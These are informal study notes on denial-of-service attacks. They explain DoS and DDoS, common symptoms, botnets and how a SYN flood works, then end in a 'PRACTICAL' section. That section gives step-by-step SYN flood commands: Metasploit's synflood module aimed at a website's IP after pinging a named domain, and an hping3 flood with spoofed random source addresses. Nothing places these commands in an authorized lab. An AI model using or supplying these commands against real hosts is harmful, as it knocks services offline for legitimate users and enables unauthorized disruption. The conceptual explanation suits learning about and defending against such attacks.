DOS and DDOS ATTACK:


DOS ATTACK:Denial of service attack --single source
DDOS ATTACK:Distributed denial of service attack  --multiple source

DOS:
>this attack is a puposefull and intentional attack.
>this attack is done on the target resources/service/
 webapp/system..etc.
>this attack make the target system overloaded and 
 over burdened with number of incoming false or fraud request.
>and the result comes with that legitimate user
 is disallowed access to any resources.

*The goal os a DoS attack is not to gain unauthorized
access to a system or to corrupt data;
It is to keep the legitimate users away from
using the system.

Common Symptoms of DoS attack are:
>slow performance
>increase in spam emails
>unavailability of a resource
>loss of access to a website
>Disconnection of a wireless or wired internet connection
>Denial of access to any internet services

some elements:

BOT: if hacked single system
BOTNET:if hacked multiple systems

SYN Attack:

 >The attacker sends a large number of syn request to the server(server) with fake source ip addresses.
 >The target machine sends back a SYN/ACK in response to the request and waits for the ack to complete the session setup.
 >the target machine doesnt get the response because the source address is fake.

PRACTICAL:

1.syn 
>ping kishaadi.com
>run metasploit msfconsole
>use auxuliary/dos/tcp/synflooding     <hit enter>
>select 67 tcp/synflood (copy this)

>use auxiliary/dos/tcp/synflood <hit enter>
>show option
>set rhosts <ip of website>
>run

2.hping3:
It spoof the multiple different source address and
sends syn packets on port 0 as default on the target.
>hping3 --help
>hping3 --flood --rand-source -S <target ip> -p 80
>hit enter
